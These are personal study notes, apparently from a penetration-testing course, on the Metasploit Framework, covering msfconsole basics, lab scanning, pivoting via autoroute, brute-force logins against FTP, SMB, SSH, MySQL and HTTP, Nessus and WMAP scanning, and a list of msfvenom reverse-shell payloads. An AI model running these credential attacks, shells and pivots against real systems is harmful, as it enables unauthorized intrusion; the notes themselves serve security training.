- **Introduction to The Metasploit Framework**
- **Metasploit Fundamentals**
- **Information Gathering & Enumeration With MSF**
- **Vulnerability Scanning With MSF**
- **Client-Side Attacks With MSF**
- **Host & Service Based Exploitation With MSF**
- **Post Exploitation With MSF**
- **Metasploit GUIs (Graphical User Interfaces)**


## Introduction

**The Metasploit Framework (MSF)**
- The Metasploit Framework (MSF) is an open-source, robust penetration testing and exploitation framework that is used by penetration testers and security researchers worldwide.
- It provides penetration testers with a robust infrastructure required to automate every stage of the penetration testing life cycle.
- It is also used to develop and test exploits and has one of the world's largest database of public, tested exploits.
- The Metasploit Framework is designed to be modular, allowing for new functionality to
- be implemented with ease.

**History**
- Developed by HD Moore in 2003
- Originally developed in Perl
- Rewritten in Ruby in 2007
- Acquired by Rapid7 in 2009
- Metasploit 5.0 released in 2019
- Metasploit 6.0 released in 2020


**Essential Terminology**
+ Interface — Methods of interacting with the Metasploit Framework.
+ Module — Pieces of code that perform a particular task, an example of a module is an exploit.
+ Vulnerability — Weakness or flaw in a computer system or network that can be exploited.
+ Exploit — Piece of code/module that is used to take advantage a vulnerability within a system, service or application.
+ Payload — Piece of code delivered to the target system by an exploit with the objective of executing arbitrary commands or providing remote access to an attacker.
+ Listener — A utility that listens for an incoming connection from a target.

**Metasploit Framework Interfaces**
The Metasploit Framework Console (MSFconsole) is an easy-to-use all in one interface that provides you with access to all the functionality of the Metasploit Framework.



**Metasploit Framework Command Line Interface (MSFcli)**
The Metasploit Framework Command Line Interface (MSFcli) is a command line utility that is used to facilitate the creation of automation scripts that utilize Metasploit modules.
+ It can be used to redirect output from other tools in to msfcli and vice versa.

Note: MSFcli was discontinued in 2015, however, the same functionality can be leveraged through the MSFconsole.


**Metasploit Community Edition**
Metasploit Community Edition is a web based GUI front-end for the Metasploit Framework that simplifies network discovery and vulnerability identification.


**Armitage**
Armitage is a free Java based GUI front-end for the Metasploit Framework that simplifies network discovery, exploitation and post exploitation.

------------------
# Metasploit Framework


**MSF Architecture**
This document describes the architecture of the Metasploit Framework (MSF).

**Components and Descriptions:**

* **MODULES:** The core components of Metasploit, categorized as:
    * **EXPLOIT:** Code that takes advantage of a vulnerability in a system.
    * **PAYLOAD:** Code that is executed on a target system after a successful exploit.
    * **ENCODER:** Used to obfuscate payloads to avoid detection.
    * **NOP (No Operation):** Used to pad payloads and maintain alignment.
    * **AUXILIARY:** Modules that perform tasks like scanning, fuzzing, and other non-exploit actions.  Examples include:
        * Port Scanners
        * Fuzzers
        * Authentication bypasses

* **LIBRARIES:** Provide code and functionalities used by the modules.
    * **Rex:** A Ruby library that provides common functionalities used by Metasploit modules (networking, encoding, etc.).
    * **MSF Core:** The central framework that manages modules and provides core functionalities.
    * **MSF Base:** Provides the foundation for building Metasploit plugins.

* **INTERFACES:** Ways to interact with Metasploit:
    * **MSFconsole:** The most common interface, a command-line console.
    * **MSFcli:** A command-line interface for running single Metasploit commands.
    * **Armitage:** A GUI-based tool that visualizes targets and exploits.
    * **Web:** A web-based interface for Metasploit.

* **TOOLS:** External tools that can be integrated with Metasploit (e.g., vulnerability scanners, network mappers).

* **PLUGINS:** Extend the functionality of Metasploit by adding new features or integrating with other tools.

**Key Relationships and Concepts:**

* Modules are the active components that perform actions.
* Libraries provide supporting code and services to modules.  "The MSF libraries facilitate the execution of modules without having to write the code necessary in order to execute them."
* Interfaces provide the means for users to interact with and control the framework and modules.
* Tools and Plugins enhance the capabilities of Metasploit.

**Note:** The original image included the "INE" logo, likely indicating it was sourced from INE (eLearnSecurity).

This combined output provides both the visual structure of the diagram and the textual descriptions, giving a complete overview of the MSF Architecture.  You can copy and paste the diagram portion into a diagramming tool for easier editing and manipulation.

____

**MSF Modules**
Exploit - A module that is used to take advantage of vulnerability and is typically paired with a payload.

Payload - Code that is delivered by MSF and remotely executed on the target after successfull exploitation. An example Of a payload is a shell that initiates a connection from the target system back to the attacker.

Encoder - Used to encode payloads in order to avoid AV detection. For example, `shikata_ga_nai` is used to encode Windows payloads.

NOPS - Used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed.

Auxiliary - A module that is used to perform additional functionality like port scanning and enumeration.

---

**MSF Payload Types**
When working with exploits, MSF provides you with two types of payloads that can be paired with an exploit:
- Non-Staged Payload - Payload that is sent to the target system as is along with the exploit.
- Staged Payload - A staged payload is sent to the target in two parts:
		The first part (stager) contains a payload that is used to establish a reverse connection back to the attacker, download the second part of the payload (stage) and execute it.

**Stagers & Stages**

Stagers - Stagers are typically used to establish a stable communication channel between the attacker and target, after which a stage payload is downloaded and executed on the target system.

Stage - Payload components that are downloaded by the stager.

**Meterpreter Payload**
The Meterpreter (Meta-Interpreter) payload is an advanced multi-functional payload that is executed in memory on the target system making it difficult to detect.

It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more.


**MSF File System Structure**
The MSF file system is organized in a simple and easy to understand format and is organized into various directories.

**MSF Module Locations**
MSF stores modules under the following directory on Linux systems:
**/usr/share/metasploit-framework/modules**

User specified modules are stored under the following directory on Linux systems:
		**~/.ms4/modules**


> /home/kali/.msf4/modules/   # To Downlaod custom Modules

### Penetration Testing With The MSF
**Penetration Testing With MSF**
The MSF can be used to perform and automate various tasks that fall under the penetration testing life cycle.

In order to understand how we can leverage the MSF for penetration testing, we need to explore the various phases of a penetration test and their respective techniques and objectives.

We can adopt the PTES (Penetration Testing Execution Standard) as a roadmap to understanding the various phases that make up a penetration test and how Metasploit can be integrated in to each phase.

**Penetration Testing Execution Standard**
The Penetration Testing Execution Standard (PTES) is a penetration testing methodology that was developed by a team of information security practitioners with the aim of addressing the need for a comprehensive and up-to-date standard for penetration testing.

**penetration-testing-execution-standard/ptes**
The Penetration Testing Execution Standard (PTES) Automation Framework

**Penetration Testing Phases**
- Information Gathering
- Enumeration
- Exploitation
- Post Exploitation
- Privilege Escalation
- Maintaining Persistent Access
- Clearing Tracks

| Penetration Testing Phase | Metasploit Framework Implementation |
|---|---|
| Information Gathering & Enumeration | Auxiliary Modules |
| Vulnerability Scanning | Auxiliary Modules<br>Nessus |
| Exploitation | Exploit Modules & Payloads |
| Post Exploitation | Meterpreter |
| Privilege Escalation | Post Exploitation Modules<br>Meterpreter |
| Maintaining Persistent Access | Post Exploitation Modules<br>Persistence |


### Installing The Metasploit Framework
+ The MSF is distributed by Rapid7 and can be downloaded and installed as a standalone package on both Windows & Linux.
+ In this course we will be utilizing the Metasploit Framework on Linux and our preferred distribution of choice is Kali Linux.
+ MSF and its required dependencies come pre-packaged with Kali Linux which saves us from the tedious process of installing MSF manually.

**The Metasploit Framework Database**
The Metasploit Framework Database (msfdb) is an integral part of the Metasploit Framework and is used to keep track of all your assessments, host data scans etc.

The Metasploit Framework uses PostgreSQL as the primary database server, as a result, we will also need to ensure that the PostgreSQL database service is running and configured correctly.

The Metasploit Framework Database also facilitates the importation and storage of scan results from various third party tools like Nmap and Nessus.


**Installation Steps**
Update our repositories and upgrade our Metasploit Framework to the latest version.
Start and enable the PostgreSQL database service.
Initialize the Metasploit Framework Database (msfdb).
Launch MSFconsole!

```bash
> sudo systemctl enable postgresql # to start the service on system startup
> sudo systemctl start postgresql # sudo service postgresql start
> sudo systemctl status postgresql # sudo service postgresql status
> sudo msfdb # see about msfdb
> sudo msfdb init # to initialize database
> sudo msfdb reinit # if u face any error but will delete all saved data
> msfconsole
> db_status # connected to postgresql

```

### MSFconsole Fundamentals
Before we can start using the Metasploit Framework for penetration testing, we need to get an understanding of how to use MSFconsole.

The Metasploit Framework Console (MSFconsole) is an easy-to-use all in one interface that provides you with access to all the functionality of the Metasploit Framework.

We will be utilizing MSFconsole as our primary MSF interface for the rest of the course.

**MSF Module Variables**
+ MSF modules will typically require information like the target & host IP address and port in order to initiate a remote exploit/connection.
+ These options can be configured through the use of MSF variables.
+ MSFconsole allows you to set both local variable values or global variable

| Variable | Purpose |
|---|---|
| LHOST | This variable is used to store the IP address of the attacker's system. |
| LPORT | This variable is used to store the port number on the attacker's system that will be used to receive a reverse connection. |
| RHOST | This variable is used to store the IP address of the target system/server. |
| RHOSTS | This variable is used to specify the IP addresses of multiple target systems or network ranges. |
| RPORT | This variable stores the port number that we are targeting on the target system. |


```bash
'ctrl+N+L' to clear the terminal
> show all # this will diplay everything exploit,modules,auxiliary
> show exploits
> search portscan
> use module_name
> options # set options for your use
> run

> back
> search cve:2017 type:exploit platform:-windows
> search cve:2017 type:exploit platform:windows

# 'connect' is an interseting cmd 
> connect [options] <host> <port>
	Communicate with a host, similar to interacting via netcat, taking advantage of any configured session pivoting
> connect ip port

```

### MSF Workspaces
```bash
> db_status
> hosts
> workspace # list workspaces
> workspace -a Test # add Test Workspace
> workspace -d Test # delete Test Workspace
> workspace -r Test PTA # renaming Test to PTA
```



-----------------
# Information Gathering & Enumeration
## Nmap
### Port Scanning & Enumeration With Nmap
+ Nmap is a free and open-source network scanner that can be used to discover hosts on a network as well as scan targets for open ports.
+ It can also be used to enumerate the services running on open ports as well as the operating system running on the target system.
+ We can output the results of our Nmap scan in to a format that can be imported into MSF for vulnerability detection and exploitation.

```bash
> nmap ip # no response if the host is windows
> nmap -Pn ip # this will give the response but lacks knowledge
> nmap -Pn -sV -O ip # host, service version, OS running

# save results
> nmap -Pn -sV -O ip -oX filename
```


### Importing Nmap Scan Results Into MSF
```bash
> service postgresql start
> msfconsole
> db_status
> workspace
> workspace -a worrksapcename
> db_import /root/filename # path to file to import
> hosts 
> services

# to directly save nmap results in msf
# create a workspace
> db_nmap -Pn -sV -O ip
> hosts 
> vulns
> services
```

## Enumeration
### Port Scanning With Auxiliary Modules
**Auxiliary modules**
+ Auxiliary modules are used to perform functionality like scanning, discovery and fuzzing.
+ We can use auxiliary modules to perform both TCP & UDP port scanning as well as enumerating information from services like FT P, SSH, HTTP etc.
+ Auxiliary modules can be used during the information gathering phase of a penetration test as well as the post exploitation phase.
+ We can also use auxiliary modules to discover hosts and perform port scanning on a different network subnet after we have obtained initial access on a targets system.

----

**Lab Infrastructure and Objectives**

Our lab infrastructure is designed to simulate a real-world penetration testing scenario.  Our objectives include:

1. **Port Discovery:** Utilize auxiliary modules within Metasploit to discover open ports on our first target system.

2. **Exploitation:** Exploit a vulnerable service running on the first target to gain an initial foothold.

3. **Pivoting:** Leverage the compromised first target to access and interact with systems on a different network subnet (our second target).

4. **Scanning the Second Target:** Use auxiliary modules to scan for open ports on the second target system, now accessible via the pivot.

```bash
# make a workspace for specific use
> search portscan # to see option

`  #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator

`

> use auxiliary/scanner/portscan/tcp # use by specifying the name
> use 5 # use by specifying the number
> show options

## get the target <targetip> and start...
> set RHOSTS <targetIP> # set the target [ip]
> show options # to see the parameters we set above here in our case [ip]
> set LHOST [ourDevice_IP]
> run/exploit # to run the scan 

# service running on port http/https
## you can use "curl" cmd to see the the output of http/htttps
> curl <ip> # vlun is XODA

######### By the found vulnerability get a meterpreter shell by the setting all the "parameter" options 


# After getting the meterpreter shell use these cmnds to get info on target.
> sysinfo # system infoo
> shell # to get a shell on meterprete,r also use
	/bin/bash -i

## After getting the shell get the [ips] of other devices connected to our target1 such as <target_ip2> 
> ifconfig # find the other device ips that are connected to target1

# run this on meterpreter
> run autoroute -s <target_ip1> # it will perform the scan on target2

> background # background the session
> sessions # to see all current sessions
> session -i 1 # i/ navigate through different sessions

## enumeration of target2
> search portscan
> use 5 # use by specifying the index number
> set RHOSTS [target_ip2] # due to autoroute,it will perform scan by using target_ip1 to target_ip2
> run # output will display the open port


> back
> search udp_sweep
> use auxiliary/scanner/discovery/udp_sweep
> 
```

### FTP Enumeration
+ FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients.
+ It is also frequently used as a means of transferring files to and from the directory of a web server.

+ We can use multiple auxiliary modules to enumerate information as well as perform brute-force attacks on targets running an FTP server.
+ FTP authentication utilizes a username and password combination, however, in some cases an improperly configured FTP server can be logged into anonymously.

```bash
> sudo service postgresql start # to connect DB with msf
> ifconfig # get the target ip
> msfconsole
> workspace -a ftpEnum
> search portscan


########## finding ftp running on port ##########
> use auxiliary/scanner/portscan/tcp # use by specifying the name
> set RHOSTS [target_ip]
> run

# the output will tell we have a open port at port 21(ftp)
# but we dont know the service version so


########## finding the version of FTP service ##########
> search ftp # displayed result is very large too find a suitable exploit
> search type:auxiliary name:ftp # less and specific output

> use auxiliary/scanner/ftp/ftp_version # for version detection 
> set RHOSTS [target_ip] 
> set PORT portNumber # only when ftp service is running on a port other than 21

# here after finding the FTP version 
> search [ftp_exploitv1.2.3] # search exploit based on the found version

# now u can use that do exploit the target further


########## burte forcing FTP for login ##########
> search type:auxiliary name:ftp

> use auxiliary/scanner/ftp/ftp_login # for ftp brute force login
> set RHOSTS [target_ip] 
> set PORT portNumber # only when ftp service is running on a port other than 21
> set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# NOTE - you can set other options also if needed
> run # you will get the credentials

########## Try to connect to ftp ##########
> ftp [target_ip] # connect to ftp there are two cases either u will get ftp connectin or.... get this error we have below

# in case of error
	Connected to 192.51.147.3. # target ip
	421 Service not available, remote server has closed connection

$IMPORTANT a brute force attack can stop the server for sometime so be cautious of that and wait for some time before processing further

#Now try anonymous auxiliary to see if the target is vuln to anonymous login
> search type:auxiliary name:ftp

> use auxiliary/scanner/ftp/anonymous
> set RHOSTS [target_ip]
> set PORT portNumber # only when ftp service is running on a port other than 21

# NOTE - you can set other options also if needed
> run 

########## To connect with ftp ##########
# exit the metasploit and
>ftp [target_ip]
username: [username]
password: [password]

## if username and password is correct u will get the ftp connection successfully
```

### SMB Enumeration
- **Definition**:
    
    - SMB (Server Message Block) is a network file sharing protocol.
- **Purpose**:
    
    - Facilitates the sharing of files and peripherals between computers on a local network (LAN).
- **Ports**:
    
    - Uses TCP port 445.
    - Originally ran on top of NetBIOS using port 139.
- **Linux Implementation**:
    
    - SAMBA is the Linux implementation of SMB, enabling Windows systems to access Linux shares and devices.
- **Enumeration Capabilities**:
    
    - Auxiliary modules can be used to:
        - Enumerate the SMB version.
        - List available shares.
        - Identify users.
        - Perform brute-force attacks to discover usernames and passwords.

```bash
> sudo service postgresql start # to connect DB with msf
> ifconfig # get the target ip
> msfconsole
> workspace -a smbEnum

> setg RHOSTS [target_ip] # set the target globally so we dont need to write it everytime we use the ip

########### info on smb version ###########
> search smb # wide search
> search type:auxiliary name:smb # specific search
> use auxiliary/scanner/smb/smb_version # version auxiliary for smb
## we have already set the RHOSTS = ip by "setg"
> run

########### smb user enumeration ###########
> search smb # wide search
> search type:auxiliary name:smb # specific search
> use auxiliary/scanner/smb/smb_enumusers # smb user enum
> show options # as we have already set the RHOSTS
> run
# output example
[*] 192.215.18.3:445 - Using automatically identified domain: SAMBA-RECON
[+] 192.215.18.3:445 - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
[+] 192.215.18.3:445 - Builtin [  ] ( LockoutTries=0 PasswordMin=5 )
[*] 192.215.18.3:445 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


########### smb share enumeration ###########
The module can be used to identify shared folders and files on Windows systems or any system that supports SMB.

> search type:auxiliary name:smb # specific search
> use auxiliary/scanner/smb/smb_enumshares # for smb shares

## set the particular parameters as u see fit 
> set ShowFiles true
> run # as the RHOSTS is globally set

# output example we can see the shared folders details
[+] 192.215.18.3:139 - public - (DISK) 
[+] 192.215.18.3:139 - john - (DISK) 
[+] 192.215.18.3:139 - aisha - (DISK) 
[+] 192.215.18.3:139 - emma - (DISK) 
[+] 192.215.18.3:139 - everyone - (DISK) 
[+] 192.215.18.3:139 - IPC$ - (IPC|SPECIAL) IPC Service (samba.recon.lab)
[*] 192.215.18.3: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


## as we remeber we saw user by "admin" in SMBuser enum scan so let do brute force
> search smb_login
> use auxiliary/scanner/smb/smb_login
> set SMBUser admin or path/to/wordlist/
> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
> run # before running u can set options if u want to

## if the scan is successfull u will get the credentials!!!
## here now we get the creds, for further exploitation we need need to "exit" the msf
> exit

# normal terminal

> smbclient -L \\\\192.91 46.3\\ -U admin # this will display list of shares available
#(`\\`) to escape the backslash character in the command line.
# Final (`\\`) to indicate that you are referring to the root of the shares on that server.
Password for [WORKGROUP\admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON

########## now to connect with one of the shares #############
smbclient \\\\192.215.18.3\\public -U admin #access public shares
# provide the found creds
>cd # navigate in the terminal
>get filename # get the file in your terminal
```

### Web Server Enumeration
- **Definition**:
    - A web server is software that serves website data over the internet.
- **Communication Protocol**:
    - Web servers use HTTP (Hypertext Transfer Protocol) to facilitate communication between clients and the server.
- **Protocol Details**:
    - HTTP is an application layer protocol that typically operates over TCP port 80.
- **Enumeration Capabilities**:
    - Auxiliary modules can be used to:
        - Enumerate the web server version.
        - Retrieve HTTP headers.
        - Perform brute-force attacks on directories.
        - Conduct various other assessments.
- **Popular Web Servers**:
    - Examples include:
        - Apache
        - Nginx
        - Microsoft IIS

```bash
> sudo service postgresql start # to connect DB with msf
> ifconfig # get the target ip
> msfconsole
> workspace -a Web_Enum
> setg RHOSTS [target_ip] # set the target globally so we dont need to write it everytime we use the ip
> setg RHOST [target_ip]

--------
########### info on http version ###########
> search smb # wide search
> search type:auxiliary name:http # specific search
> use auxiliary/scanner/http/http_version # version detection
> options
## if the website is having ssl certificate set paramter for ssl cert to true
> set SSL true
> run

--------
########### info on http header ###########
> search http_header # the name for header
> use auxiliary/scanner/http/http_header 
> options

## you can set the METHOD to GET,HEAD
## also set the other parameter as u see fit like proxies,URI(a specific dir in web server)

--------
########### info on hidden http dir(robots.txt,etc) ###########
> search robots_txt
> use auxiliary/scanner/http/robots_txt
> run # or set other parameters

## now to see the content of disallowed dir of "robots.txt"
> curl http://ip/data/ # fetch the data from that hidden dir
## this can give version of "apache "etc

--------
########### brute force on http to find directory ###########
> search dir_search
> use auxiliary/scanner/http/dir_scanner
> run # or set parameter

--------
########### brute force on http to find files ###########
> search files_dir
> use auxiliary/scanner/http/files_dir
> options # set parametrs
> run
## found files have code 200..

--------
########### brute force on http to login ###########
> search http_login
> use auxiliary/scanner/http/http_login
> set AUTH_URI /secure/ # set this for the dir that has authentication enabled
## u can also change speed based on server capabilities

> set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

## if the userpass_file it set unset that
> unset USERPASS_FILE # if needed in case 2 files are set for password
> set VERBOSE false # to remove false creds results


--------
########### info by apache ###########
# helps to identify valid usernames and users
> search apache_userdir_enum
> use 
> set <parameter> # parameter
> run
```

### MySQL Enumeration
- **Definition**:
    - MySQL is an open-source relational database management system (RDBMS) based on SQL (Structured Query Language).
- **Common Uses**:
    - Typically used to store records and customer data.
    - Most commonly deployed for storing web application data.
- **Default Port**:
    - MySQL uses TCP port 3306 by default.
    - It can also be hosted on any open TCP port.
- **Enumeration and Functionality**:
    - Auxiliary modules can be utilized to:
        - Enumerate the MySQL version.
        - Perform brute-force attacks to identify passwords.
        - Execute SQL queries.
        - Conduct various other database-related tasks.

```bash
> sudo service postgresql start # to connect DB with msf
> ifconfig # get the target ip
> msfconsole
> workspace -a sql_Enum
> setg RHOSTS [target_ip] # set the target globally so we dont need to write it everytime we use the ip
> setg RHOST [target_ip]


--------
########### info on mysql version ###########
> search mysql # wide search
> search type:auxiliary name:mysql
> use auxiliary/scanner/mysql/mysql_version
## set the parameter if needed
> run 


--------
########### access on mysql ###########
> search mysql_login
> use auxiliary/scanner/mysql/mysql_login
## set the parameter if needed
## we can set the username option to "root" as every device has root username root
> options
> set USERNAME root # or other username if u have a valid username
> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
> run 
# if successful you will get the password for that username
# now u have both username & password 


--------
########### Enumeration on mysql ###########
> search mysql_enum
> use auxiliary/admin/mysql/mysql_enum # this falls under admin so 
## set the parameter as
> options
> set USERNAME <username> # here "root" as we did above in access on sql
> set PASSWORD <password> # found in the above set mysql_login


--------
########### Enumeration on mysql for sql ###########
> search mysql_sql
> use auxiliary/admin/mysql/mysql_sql # this falls under admin so 
## set the parameter as
> options
> set PASSWORD <password> # found previously
> set USERNAME <username> # here we used root/any other u found during scanning
> run 
	## output will display mysql and host version 
	# which we already know from previous scans so...

$important
# set SQL parameter for querry 
> set SQL show databases; # this will show all the databases

------
#### mysql_schemadump for detailed enumeration
> search mysql_schemadump
> use auxiliary/scanner/mysql/mysql_schemadump
> options
> set PASSWORD <password> # found previously
> set USERNAME <username> # here we used root/any other u found during scanning
> run 

######### check the info we have gathered so far ############# 
> hosts 
> creds
> services
> loot # displays our findings so far, like found creds



############# TO ACCESS SQL WITH NORMAL TERMINAL ############# 

## this will give u the mysql access
> mysql [ip] -u root -p # here we know user "root" password "twinkle" from our previous scans
> mysql -h [ip] -u root -p # -h for remote login

## use sql querries to fetch data from database
mysql> show databases;
mysql> show <database_name>
```

### SSH Enumeration
- **Definition**:
    - SSH (Secure Shell) is a remote administration protocol that provides secure encrypted communication.
- **Successor to**:
    - SSH is the successor to Telnet, which does not offer encryption.
- **Common Uses**:
    - Typically used for remote access to servers and systems.
- **Default Port**:
    - SSH uses TCP port 22 by default.
    - It can be configured to use any other open TCP port.
- **Enumeration and Functionality**:
    - Auxiliary modules can be utilized to:
        - Enumerate the version of SSH running on the target.
        - Perform brute-force attacks to identify passwords.
        - Gain remote access to the target system upon successful authentication.

```bash
> sudo service postgresql start # to connect DB with msf
> ifconfig # get the target ip
> msfconsole
> workspace -a ssh_Enum
> setg RHOSTS [target_ip] # set the target globally so we dont need to write it everytime we use the ip
> setg RHOST [target_ip]

> search ssh # wide search
> search type:auxiliary name:ssh


------
############# info on ssh_version ############# 
> use auxiliary/scanner/ssh/ssh_version
> options # set paramters as needed
> run # it will display the verion of ssh


------
############# enumeration by ssh_login ############# 
> use auxiliary/scanner/ssh/ssh_login
> options # set paramters as needed
> set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# NOTE - you can set other options also if needed
> run # you will get the credentials
## you will get the creds if its successful & take a note of creds for further analysis

## if the above is not successful you can use 


------
############# enumeration by ssh_enumusers ############# 
## use this to find the usernames and shorten your brute force
> search ssh_enumusers
> use auxiliary/scanner/ssh/ssh_enumusers
> options # set paramters as needed
> set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
> run
```


### SMTP Enumeration
- **Definition**:
    - SMTP (Simple Mail Transfer Protocol) is a communication protocol used for the transmission of email.
- **Default Port**:
    - SMTP uses TCP port 25 by default.
    - It can also be configured to run on TCP ports 465 and 587.
- **Enumeration and Functionality**:
    - Auxiliary modules can be utilized to:
        - Enumerate the version of SMTP running on the target.
        - Identify user accounts on the target system.
```bash
> sudo service postgresql start # to connect DB with msf
> host <url> # get the target ip
> msfconsole
> workspace -a ssh_Enum
> setg RHOSTS [target_ip] # set the target globally so we dont need to write it everytime we use the ip
> setg RHOST [target_ip]

> search ssh # wide search
> search type:auxiliary name:smtp


## STMP may be configured on different ports so also do a portscan
------
############# info on smtp_version ############# 
> use auxiliary/scanner/smtp/smtp_version
> options # set paramters as needed
> run # it will display the verion of smtp


------
############# info on smtp_enum ############# 
> use auxiliary/scanner/smtp/smtp_enum
> options # set paramters as needed
> run # it will display the usernames for SMTP 

```


----------
#  Vulnerability Scanning

Vulnerability scanning & detection is the process of scanning a target for vulnerabilities and verifying whether they can be exploited.

So far, we have been able to identify and exploit misconfigurations on target systems. However, in this section, we will be exploring the process of utilizing auxiliary and exploit modules to scan and identify inherent vulnerabilities in services, operating systems, and web applications.

This information will come in handy during the exploitation phase of this course.

We will also be exploring the process of utilizing third-party vulnerability scanning tools like Nessus and how we can integrate Nessus functionality into the MSF (Metasploit Framework).

### With Metasploit

```bash
> sudo nmap -sn ip # detect active host

# get target id
> service postgresql start
> msfconsole
> db_status
> setg RHOSTS targetip
> workspace -s MS3 # metasploitable3
> db_namp -sV -sS -O ip # see the results
> hosts
> services

## now we know a service is running on a server or port but what can we do..
> search type:auxiliary name:service_name/version

# use metasploit's "search" option to anaylze the found vulnerablity and versions
> search <vulnerability_name>
> search type:auxiliary name:<vuln>


############## can also use exploit DB ##############
> searchsploit <vulnerability_name>
> searchsploit "Microsoft Windows SMB" # for full 
> searchsploit "Microsoft Windows SMB" | grep -e "Metasploit" # -e expression filter


############ metasploit-autopwn (github) ##############
- To use this your enumeration data should be present in the metasploit database
- Thus import nmapscan.txt or do the scans by using msf auxiliary modules
> cd Download
> wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
> cd metasploit-autopwn
> mv db_autopwn.rb /usr/share/metasploit-framework/plugins



############## msf ##############
msf> msfconsole
MSF > load db_autopwn # load the plugin
[*] Successfully loaded plugin: db_autopwn
### run the plugin
> db_autopwn # start the plugin
> db_autopwn -p -R great -e -q 192.168.56.101
> db_autopwn -p -t -PI 445 # specific port scan

## use these cmds when your scan.txt data is saved already saved in msf
> analyze
> vulns
```

### With Nessus
+ Nessus is a proprietary vulnerability scanner developed by Tenable.
+ We can utilize Nessus to perform a vulnerability scan on a target system. after
which, we can import the Nessus results in to MSF for analysis and exploitation.
+ Nessus automates the process of identifying vulnerabilities and also provides us
with information pertinent to a vulnerability like the CVE code.
+ We can use the free version of Nessus (Nessus Essentials), which allows us to
scan upto 16 IPs.
```bash
# Installation
+ Go to the nessus website and select nessus essentials
+ register and get the mail 
+ navigate to the dowloads page and download the suitable version for your OS
https://127.0.0.1:8834/

# Linux
> cd Downloads
> chmod +x [nessus]
> sudo dpkg -i [nessus]
> sudo systemctl start nessusd.service

Go through the installation process in browser

# windows 
Download the file run it & Go through the installation process

- Do a scan and download its .nessus file


> sudo service postgrsql start
# start metasploit
> msfconsole
> workspace -a 
> db_import /path/to/scan.nesuss

# confirm the import was successfull
> hosts
> services
> vulns

  
> search cve:2017 name:smb 
> search MS12-020 
> search cve:2019 name:rdp 
> search cve:2015 name:ManageEngine 
> search PHP CGI Argument Injection

```


### With WMAP
+ WMAP is a powerful, feature-rich web application vulnerability scanner that can be used to automate web server enumeration and scan web applications for vulnerabilities.
+ WMAP is available as an MSF plugin and can be loaded directly into MSF.
+ WMAP is fully integrated with MSF, which consequently allows us to perform web app vulnerability scanning from within the MSF.
```bash
> sudo service postgrsql start
# start metasploit
> msfconsole
> workspace -a 


# WMAP in msfconsole
load wmap
wmap_sites -a <TARGET_IP>
wmap_sites -l
wmap_targets -t <URL>
wmap_targets -l

wmap_run -t
wmap_run -e
wmap_vulns -l

# msfconsole
use 
```

------------
# Client-Side Attacks
**Definition**: Client-side attacks target end-user devices, coercing users to execute malicious payloads that connect back to the attacker.

 **Key Characteristics**

1. **Human Vulnerabilities**: Exploit psychological manipulation rather than technical flaws.
2. **Malicious Payloads**:
    - **Documents**: PDFs, Word files with embedded macros.
    - **Executables**: Standalone files disguised as legitimate software.
3. **Execution**: Payloads connect back to the attacker for data exfiltration or control.
4. **AV Evasion**: Techniques include obfuscation, packing, and using legitimate tools to avoid detection.

**Common Techniques**

1. **Phishing**: Emails tricking users into clicking links or downloading attachments.
2. **Drive-by Downloads**: Compromised websites automatically downloading malware.
3. **Malvertising**: Malicious ads delivering malware.
4. **Social Engineering**: Manipulating users through trust or urgency.

 **Prevention and Mitigation**

5. **User Education**: Train users to recognize phishing and suspicious files.
6. **Antivirus Solutions**: Keep security software updated.
7. **Regular Updates**: Update software to patch vulnerabilities.
8. **Email Filtering**: Block malicious attachments and links.
9. **Sandboxing**: Test suspicious files in a controlled environment.

## Payloads

### Generating Payloads With Msfvenom
```bash
# see available payloads we can generate
> msfvenom --list payloads
	# output
	netware/shell/reverse_tcp                                          Connect to the NetWare console (staged). Connect back to the attacker
    nodejs/shell_bind_tcp                                              Creates an interactive shell via nodejs
    nodejs/shell_reverse_tcp                                           Creates an interactive shell via nodejs
    nodejs/shell_reverse_tcp_ssl                                       Creates an interactive shell via nodejs, uses SSL
    osx/aarch64/exec                                                   Execute an arbitrary command
    osx/aarch64/meterpreter/reverse_tcp                                Inject the mettle server payload (staged). Connect back to the attacker
    osx/aarch64/meterpreter_reverse_http                               Run the Meterpreter / Mettle server payload (stageless)
    osx/aarch64/meterpreter_reverse_https                              Run the Meterpreter / Mettle server payload (stageless)
